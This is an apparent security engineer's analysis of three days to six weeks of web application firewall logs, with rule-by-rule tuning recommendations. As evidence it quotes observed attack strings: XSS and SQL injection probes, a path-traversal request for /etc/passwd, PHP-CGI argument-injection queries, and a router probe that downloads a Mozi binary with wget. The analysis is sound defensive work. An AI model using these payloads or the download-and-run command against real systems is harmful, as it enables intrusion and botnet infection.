# Production WAF log analysis — 2026-05-08

## Executive summary

Five actionable findings from 11,088 WAF events across three production servers (orion, virgo, mars):

1. **`WAF_PROXY_HDR:PROXY_HDR_SQLI` is dominated by a single distributed scraper (3,281 of 3,283 events from AS200373 / 3xK Tech GmbH).** The rule isn't broken — the scraper sends malformed `X-Forwarded-For` values that the SQLi detector flags. But 32% of all your WAF events come from this one source hitting one Greek e-commerce site (vitolighting.com). Either keep `challenge` (current behaviour) and accept the noise, or add an IP-allowlist + per-host exception for vitolighting if the operator confirms the scraper is benign. Recommend: **keep, but add the option of host/ASN exclusion via existing `webdetector_excludes` mechanism**.

2. **`WAF_XSS` has clear false-positive patterns from scraper traffic.** Multiple sites have HTML containing `<a href="javascript:void(0)">`. When scrapers (incl. Facebook) follow those, they hit `/javascript:void(0)` URIs and trigger XSS challenge. ~10 of 16 XSS events fit this pattern. Currently `challenge` — bots get a challenge page → bad for SEO/scrapers. Recommend: **add a path-level exception for URIs that are exactly `/javascript:` or `/javascript:void(0)` — those are link-pattern artifacts, not attacks.**

3. **`WAF_TRAVERSAL` is fine but should stay logonly.** 15 of 32 events are Facebook (AS32934) following user-submitted `/.../path` URLs (link previewer). The rest are real LFI/SQLi probes. Mode is currently `logonly` — correct. Don't promote.

4. **One persistent webshell uploader on dabizasfoods.gr (164.68.106.245 / Contabo, 254 attempts).** All `.phtml` filename uploads to `/customer/address_file/upload` (Magento) — clear webshell drops. Currently `challenge`. Recommend: **promote `WAF_UPLOAD_FNAME` from `challenge` to `block` — the rule has near-zero FP risk (random hash filenames + .phtml/.php extensions on upload endpoints) and 100% of events are this attack pattern**.

5. **Half the ruleset never fires in this sample.** 16 of 33 rules had zero hits over 11K events: `WAF_RCE`, `WAF_HEADER_VULN`, `WAF_CTRL_CHARS`, `WAF_SSRF`, `WAF_JS_PROTO`, `WAF_PHP_WEBSHELL_BODY`, `WAF_SCRIPT_OBFUSCATION`, `WAF_UPLOAD_OBFUSCATION`, `WAF_SQLI`, `WAF_XXE`, `WAF_CRLF`, `WAF_HTTP_SMUGGLING`, `WAF_CMD_PARAM`, `WAF_DEBUG_TOGGLE`, `WAF_SERIALIZE`, `WAF_B64_INJECT`. Most are body-inspection rules limited by `CFM_WAF_BODY_MAX_LEN=8192` (gap #1 in `docs/waf.md`). Cannot conclude whether they're broken vs. simply not exercised in this window. Recommend: **keep all, but raise `CFM_WAF_BODY_MAX_LEN` and re-analyze in a month**.

---

## Dataset

| File | Server | Events | Date range | Span |
|---|---|---|---|---|
| `2b4ee9fc-orioncfm.waf.log.txt` | orion | 6,952 | 2026-05-05 22:22 → 2026-05-08 23:05 | 3 days |
| `5b620cc1-virgocfm.waf.log.txt` | virgo | 1,716 | 2026-05-05 21:43 → 2026-05-08 23:04 | 3 days |
| `967154a6-marscfm.waf.log.txt` | mars | 2,420 | 2026-03-27 15:40 → 2026-05-08 23:03 | 6 weeks |
| **Total** | — | **11,088** | — | — |

Mars's range is much wider so its rate (~58 events/day) is far lower than orion's (~2,300/day). Orion's volume is dominated by the 3xK Tech scraper on vitolighting.

---

## Tier 1 — Frequencies

### Hit count by reason family

```
awk '{ for (i=1;i<=NF;i++) if ($i ~ /^reason=/) { sub(/^reason=/, "", $i); split($i, a, ":"); print a[1] } }' *.txt | sort | uniq -c | sort -rn
```

| Reason family | Count | % of total |
|---|---:|---:|
| WAF_BAD_UA | 4,896 | 44.2% |
| WAF_PROXY_HDR | 3,283 | 29.6% |
| WAF_AUTH_BURST | 1,794 | 16.2% |
| WAF_IP_HOST | 767 | 6.9% |
| WAF_UPLOAD_FNAME | 278 | 2.5% |
| WAF_TRAVERSAL | 32 | 0.3% |
| WAF_XSS | 16 | 0.1% |
| WAF_CT_ANOMALY | 12 | 0.1% |
| WAF_UPLOAD_CONTENT | 4 | <0.1% |
| WAF_PHP_WRAPPER | 3 | <0.1% |
| WAF_SHELLSHOCK | 1 | <0.1% |
| WAF_EXPLOIT_METHOD | 1 | <0.1% |
| WAF_CMD_PAYLOAD | 1 | <0.1% |

### Hit count by full reason (top 15)

| Full reason | Count |
|---|---:|
| `WAF_PROXY_HDR:PROXY_HDR_SQLI:x-forwarded-for` | 3,281 |
| `WAF_BAD_UA:UA_FAKE_LEGACY_MSIE:score=99` | 2,530 |
| `WAF_BAD_UA:UA_FAKE_LEGACY_WINDOWS:score=99` | 1,669 |
| `WAF_AUTH_BURST:AUTH_WP_LOGIN_HEAD` | 1,018 |
| `WAF_IP_HOST` | 767 |
| `WAF_AUTH_BURST:AUTH_WP_XMLRPC_MULTICALL` | 618 |
| `WAF_BAD_UA:UA_EMPTY+NO_ACCEPT+NO_REFERER+URI_GIT:score=8` | 324 |
| `WAF_BAD_UA:UA_FAKE_LEGACY_TRIDENT:score=99` | 300 |
| `WAF_AUTH_BURST:AUTH_WP_XMLRPC_POST_BURST` | 157 |
| `WAF_TRAVERSAL` | 32 |
| `WAF_XSS` | 16 |
| `WAF_CT_ANOMALY:CT_NON_STRING` | 12 |
| `WAF_BAD_UA:UA_ZGRAB:score=99` | 12 |
| `WAF_BAD_UA:UA_LIBWWW+...+URI_ENV:score=8` | 12 |
| `WAF_BAD_UA:UA_LIBWWW+...+URI_GIT:score=8` | 10 |

### Action distribution

| Action | Count | % |
|---|---:|---:|
| `challenge_triggered` | 10,274 | 92.7% |
| `logonly_triggered` | 814 | 7.3% |
| `block_triggered` | **0** | 0% |

**No blocks fired in the entire dataset.** All rules with `block` default mode either never fired (WAF_RCE) or matched their challenge-mode rules instead. This confirms the post-clearance conversion paths (`block_pc`, `logonly_pc`) are also unused in this period — but those only apply to clearance-holding clients, and most events here are scanners without clearance.

### Per-server reason families

| Family | orion | virgo | mars |
|---|---:|---:|---:|
| WAF_BAD_UA | 2,015 | 1,023 | 1,858 |
| WAF_PROXY_HDR | 3,283 | 0 | 0 |
| WAF_AUTH_BURST | 1,071 | 354 | 369 |
| WAF_IP_HOST | 275 | 312 | 180 |
| WAF_UPLOAD_FNAME | 259 | 18 | 1 |
| WAF_TRAVERSAL | 28 | 3 | 1 |
| WAF_XSS | 6 | 3 | 7 |
| WAF_CT_ANOMALY | 6 | 3 | 3 |
| WAF_UPLOAD_CONTENT | 3 | 0 | 1 |
| WAF_PHP_WRAPPER | 3 | 0 | 0 |
| WAF_SHELLSHOCK | 1 | 0 | 0 |
| WAF_EXPLOIT_METHOD | 1 | 0 | 0 |
| WAF_CMD_PAYLOAD | 1 | 0 | 0 |

`WAF_PROXY_HDR` is **orion-exclusive** (3,283 of 3,283). Either orion has different upstream/CDN config than virgo and mars, or vitolighting (its top host) is on orion only and the scraper is fixated on it.

### Method distribution

| Method | Count |
|---|---:|
| GET | 8,941 |
| POST | 1,098 |
| HEAD | 1,046 |
| OPTIONS | 2 |
| PROPFIND | 1 |

---

## Tier 2 — Patterns

### Top hosts

| Host | Total events | % of total |
|---|---:|---:|
| `www.vitolighting.com` | 3,567 | 32.2% |
| `www.melanaki-shop.gr` | 1,407 | 12.7% |
| `polykarpos-bio.gr` | 386 | 3.5% |
| `thegreenoffice.gr` | 379 | 3.4% |
| `dabizasfoods.gr` | 261 | 2.4% |
| `157.90.128.246` (bare IP) | 172 | 1.6% |
| `84.54.49.202` (bare IP) | 168 | 1.5% |
| `84.54.49.63` (bare IP) | 144 | 1.3% |

vitolighting alone is one-third of all events. melanaki-shop is most of mars's volume. Bare-IP hosts (84.54.49.x, 157.90.128.x) are scanner enumeration of address ranges.

### Top source IPs

| IP | Events | What |
|---|---:|---|
| `164.68.106.245` (Contabo) | 256 | **Persistent webshell uploader on dabizasfoods.gr.** 254 of 256 are `WAF_UPLOAD_FNAME:UPLOAD_PHTML` + `WAF_UPLOAD_CONTENT:UPLOAD_PHP_TAG`. |
| `204.76.203.206` | 122 | Mixed |
| `216.26.225.206` | 62 | 3xK Tech ASN — vitolighting scraper |
| `216.26.239.203` | 49 | 3xK Tech ASN — vitolighting scraper |
| `185.16.39.146` | 46 | Mixed |

### ASN diversity per rule (top ASN's share)

| Rule | Top ASN | Events from top ASN | Total | Concentration |
|---|---|---:|---:|---:|
| `WAF_PROXY_HDR` | AS200373 3xK Tech GmbH | 3,281 | 3,283 | **99.9%** |
| `WAF_UPLOAD_FNAME` | AS51167 Contabo GmbH | 254 | 278 | **91.4%** |
| `WAF_TRAVERSAL` | AS32934 Facebook | 15 | 32 | 46.9% |
| `WAF_XSS` | AS32934 Facebook | 4 | 16 | 25.0% |
| `WAF_BAD_UA` | AS396982 Google LLC | 791 | 4,896 | 16.2% |
| `WAF_AUTH_BURST` | AS396982 Google LLC | 598 | 1,794 | 33.3% |

**Single-ASN concentration ≥ 90% is strongly suggestive of one actor** (either a single attacker or a single FP source). PROXY_HDR and UPLOAD_FNAME both hit this threshold but the interpretation differs — see Tier 3.

### Suspicious URI patterns by rule

**WAF_XSS** — 16 events. Roughly half are real attacks, half are scrapers following `javascript:void(0)` anchors:

Real attacks (samples):
- `/checkout-2/?lang=<script>alert('XSS')</script>` (URL-encoded in original)
- `/?q=<script>alert(1)</script>`
- `/index.php?__waf_test__=' OR '1'='1' UNION SELECT...` (literal WAF tester)

Scraper FPs (samples):
- `/javascript:void(0)` (welder.gr, vielfys.gr)
- `/?next=%2FjavaScript%3Avoid%280%29%3B`
- `/garden_machinery/cleaning/k1-628-209-0/javaScript:void(0)`
- `/javaScript:void(0);` (e-geoponiki.gr from Facebook)

The detector matches `javascript:` substring. URLs that *literally end in* `/javascript:void(0)` are scrapers following malformed anchor hrefs — not attacks.

**WAF_TRAVERSAL** — Facebook hits use `/.../foo` (literal `/...`), which is a Facebook-quirk for share-debug URLs:
- `host=hellascanyon.com uri=/.../eyritania-roska-pantavrexi`
- `host=karamixailidisbros.gr uri=/.../epangelmatika/`

Non-Facebook traversal events are real LFI/SQLi probes:
- `host=infected.gr uri=/application/..%252F..%252F..%252Fetc%252Fpasswd` (clear LFI probe)
- `host=3-notes.com uri=/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][taxonomy]=...UNION...SELECT...` (double-URL-encoded SQLi via WooCommerce REST)

**WAF_PHP_WRAPPER** — 3 events, all CVE-2024-4577 (PHP-CGI argument injection) probes:
- `/hello.world?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input`
- `/php-cgi/php-cgi.exe?%add+allow_url_include=1+...`

**WAF_SHELLSHOCK** — 1 event. URI is JavaScript code embedded by a scraper: `/function(t){locationHref=t},getLocationHref=function(){return...`. The `() {` substring matched the Shellshock pattern. **FP**, but only 1 event so low priority.

**WAF_EXPLOIT_METHOD** — 1 event. PROPFIND to `webdisk.kirizopoulos.gr/`. Real WebDAV scan.

**WAF_CMD_PAYLOAD** — 1 event. Mirai-style Netgear router probe with `host=_` (no Host header): `/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=...wget+http://192.168.1.1:8088/Mozi.m...`. Real probe targeting routers, not your sites — your nginx accepted it because of empty Host. Worth understanding why.

**WAF_CT_ANOMALY** — All 12 events from one IP (`34.42.34.237`, AS396982 Google LLC) hitting POST `/` with non-string Content-Type. Likely a Google-Cloud-hosted scanner probing for HTTP parser bugs. Currently logonly.

**WAF_UPLOAD_CONTENT** — 4 events:
- 2× from `164.68.106.245` (Contabo) on dabizasfoods.gr targeting `/pub/media/customer_address/.../customer/address_file/upload` (Magento)
- 1× targeting `/customer/address_file/upload` on inoxweb.gr (same Magento path)
- 1× targeting `/wp-content/plugins/simple-file-list/ee-upload-engine.php` on kavoukistools.gr (CVE-2024-2876, Simple File List plugin RCE)

All 4 are real webshell upload attempts.

---

## Tier 3 — Per-rule recommendations

| Rule | Default mode | Hits | Recommendation | Reason |
|---|---|---:|---|---|
| `WAF_BAD_UA` | challenge | 4,896 | **Keep** | Real attackers using fake-legacy IE / scanner UAs. Score-based, low FP. |
| `WAF_PROXY_HDR` | challenge | 3,283 | **Keep + investigate** | Concentrated 99.9% on one ASN scraping vitolighting. Real if scraper is hostile, FP if benign. Operator should decide; can exclude per-host via `webdetector_excludes` if benign. |
| `WAF_AUTH_BURST` | challenge | 1,794 | **Keep** | Standard WP brute force (login HEAD, XMLRPC multicall, XMLRPC POST burst). Distributed across many ASNs. |
| `WAF_IP_HOST` | logonly | 767 | **Keep** | Bare-IP host = scanner enumeration. Logonly is correct (bots scan IP ranges; not actionable but useful signal). |
| `WAF_UPLOAD_FNAME` | challenge | 278 | **Promote to block** | 91% from one IP, 100% .phtml/.php with random hash names hitting Magento upload endpoints. Near-zero FP risk for random hash filenames. |
| `WAF_TRAVERSAL` | logonly | 32 | **Keep** | Mixed Facebook FPs (`/.../`) and real LFI probes. Logonly is correct because promoting would challenge Facebook. |
| `WAF_XSS` | challenge | 16 | **Tune** | Add path exception for URIs ending in `/javascript:void(0)` (literal anchor href, not attack). Or relax detector to require `javascript:` PLUS something else (e.g. `<` or `=`). |
| `WAF_CT_ANOMALY` | logonly | 12 | **Keep** | One Google-Cloud scanner probing parser. Logonly correct. |
| `WAF_UPLOAD_CONTENT` | challenge | 4 | **Promote to block** | 4 of 4 are real webshell uploads. Already in high-risk reason set. |
| `WAF_PHP_WRAPPER` | logonly | 3 | **Promote to challenge** | All 3 are CVE-2024-4577 PHP-CGI probes. Real attacks, low ambiguity. |
| `WAF_SHELLSHOCK` | challenge | 1 | **Tune** | Single FP (JS code with `() {`). Pattern needs context (must be in headers, not URI path). Low priority — 1 event. |
| `WAF_EXPLOIT_METHOD` | challenge | 1 | **Keep** | Single PROPFIND probe — real. |
| `WAF_CMD_PAYLOAD` | logonly* | 1 | **Keep** | Single real Mirai router probe. Note: `host=_` reaching nginx is worth investigating separately. |
| `WAF_RCE` | block | 0 | **Keep, monitor** | Body-inspection rule — may be limited by `CFM_WAF_BODY_MAX_LEN=8192`. Don't conclude broken from absence. |
| `WAF_HEADER_VULN` | challenge | 0 | **Keep, monitor** | httpoxy / CVE-2017-7269 / CVE-2025-24813 — niche, expected zero in normal windows. |
| `WAF_CTRL_CHARS` | logonly | 0 | **Keep, monitor** | Niche detector. |
| `WAF_SSRF` | logonly | 0 | **Keep, monitor** | `file://`, `gopher://` etc. — niche. |
| `WAF_JS_PROTO` | challenge | 0 | **Keep, monitor** | `__proto__` pollution — JS-specific, niche on Greek e-commerce. |
| `WAF_PHP_WEBSHELL_BODY` | challenge | 0 | **Keep, monitor** | Body-only. Probably suppressed by 8K body cap on real webshell uploads. |
| `WAF_SCRIPT_OBFUSCATION` | challenge | 0 | **Keep, monitor** | Body-only. |
| `WAF_UPLOAD_OBFUSCATION` | challenge | 0 | **Keep, monitor** | Body-only. |
| `WAF_SQLI` | challenge | 0 | **Investigate** | Suspicious — SQLi probes are frequent (we saw double-URL-encoded SQLi caught by TRAVERSAL instead). Pattern may be too narrow. |
| `WAF_XXE` | challenge | 0 | **Keep, monitor** | Body-only XML probes — rare. |
| `WAF_CRLF` | challenge | 0 | **Keep, monitor** | Niche. |
| `WAF_HTTP_SMUGGLING` | logonly | 0 | **Keep, monitor** | Niche, body-related. |
| `WAF_CMD_PARAM` | challenge | 0 | **Keep, monitor** | Suspicious param keys (`exec=`, `cmd=`). Should fire on Mirai-style probes — surprising it didn't catch the Netgear one. Worth checking pattern coverage. |
| `WAF_DEBUG_TOGGLE` | logonly | 0 | **Keep, monitor** | Niche. |
| `WAF_SERIALIZE` | logonly | 0 | **Keep, monitor** | PHP serialize markers, body-only. |
| `WAF_B64_INJECT` | challenge | 0 | **Keep, monitor** | Body-only. |

\* `WAF_CMD_PAYLOAD` mode is per-tag (semi_cmd, pipe_wget, pipe_curl, pipe_bash, pipe_sh = challenge; backtick = logonly). The single hit (PAY_SEMI_CMD) is challenge.

### Concrete mode changes proposed

```lua
waf.set_rule("rule_upload_filename",  "block")     -- was challenge, 100% real attacks
waf.set_rule("rule_upload_content",   "block")     -- was challenge, 100% real attacks (high-risk family already)
waf.set_rule("rule_php_wrappers",     "challenge") -- was logonly, 100% real CGI-injection probes
```

`WAF_XSS` tuning is detector-level (path exception or stricter pattern), not a mode change. See Tier 2 for the path patterns to exclude.

---

## Removal candidates (covered by upstream defenses?)

None of the 33 rules are clearly redundant with upstream defenses based on this data. Some candidates I considered and rejected:

- **`WAF_HEADER_VULN:HTTPOXY`** — covered by `unset HTTP_PROXY` in modern Apache/PHP-FPM. But the rule fires only on actual `Proxy:` headers, not the env var; modern fix doesn't cover the request side. Keep.
- **`WAF_TRAVERSAL`** — Apache rejects `../` by default in normalized paths. But CFM sees the *raw* request before Apache normalizes, and double-encoded variants (`%252F`) don't get normalized. Keep.
- **`WAF_EXPLOIT_METHOD`** — Apache `<LimitExcept>` blocks unwanted methods if configured. Most operators don't configure it. Keep.

The 16 zero-hit rules might look like removal candidates but the data is insufficient — they cover niche or body-specific attacks that a 3-day window may not exercise.

---

## What we couldn't analyze

1. **No User-Agent in `cfm.waf.log`.** The log line lacks UA. We could only infer attacker tooling from URI shape and ASN. To strengthen FP detection, the log writer at `internal/detectors/webdetector_register.go:384` could be extended to include UA.
2. **No access log** (operator chose WAF-only). We cannot detect coverage gaps — i.e., real attacks that fired no rule. Examples we can't catch: Log4Shell probes that targeted hosts not in this dataset, body-encoded webshells over 8 KB.
3. **No request body sample.** Can't validate body-rule effectiveness.
4. **Per-rule ASN diversity is the only "FP score" I have.** Without ground truth (operator confirmation that scraper X is benign), we can't measure FP rate precisely.
5. **Time window is short** for half the ruleset. 3 days is too short for niche detectors (XXE, CRLF, smuggling, etc.).
6. **One outlier (vitolighting/3xK Tech) skews orion's stats.** Without that one source, orion would show ~3,670 events instead of 6,952.

---

## Suggested next actions (in order)

1. **Promote `WAF_UPLOAD_FNAME` and `WAF_UPLOAD_CONTENT` to `block`** — high-confidence real attacks; current `challenge` mode lets attackers complete the challenge (or stash the cookie) and retry. As one-line `set_rule` calls or by editing `cfm_waf.lua` CFG defaults. Watch logs for a week.

2. **Promote `WAF_PHP_WRAPPER` from `logonly` to `challenge`** — 100% of hits in this window are CVE-2024-4577 probes. Low FP risk.

3. **Tune `WAF_XSS`** — add a path-level exception for URIs that are exactly `/javascript:` or end in `/javascript:void(0)`. Implementation: small allow-list early in `detect_xss` or a normalized-URI check.

4. **Decide on `WAF_PROXY_HDR` for vitolighting/3xK Tech** — operator-side question. If the scraper is benign (e.g. a price-comparison engine vitolighting wants indexed), add a per-host exclusion. If hostile, status quo is correct.

5. **Investigate why `WAF_SQLI` never fired** — multiple SQLi probes were caught by `WAF_TRAVERSAL` (double-encoded UNION SELECT in WooCommerce REST taxonomy). The SQLi detector should have caught those. Pattern coverage gap?

6. **Investigate `WAF_CMD_PARAM` coverage** — the Mirai Netgear probe (`?...&todo=syscmd&cmd=...`) should have triggered a parameter-key match (`cmd=`) on top of `WAF_CMD_PAYLOAD`. Did it?

7. **Raise `CFM_WAF_BODY_MAX_LEN`** for upload endpoints (or globally to 64K) so body-inspection rules can fire on larger uploads. Re-analyze in 4 weeks.

8. **Add UA to `cfm.waf.log`** — single-line change in `internal/detectors/webdetector_register.go:384`. Massively improves future FP analysis.

9. **Optional**: add WAF hit-rate counters (gap #3 in `docs/waf.md`) so we don't need ad-hoc log analysis next time. Could be shdict-based per-rule counters exposed via a stats endpoint.

10. **Re-analyze** with the same procedure in 4 weeks after the changes above land. Compare FP rates and coverage.
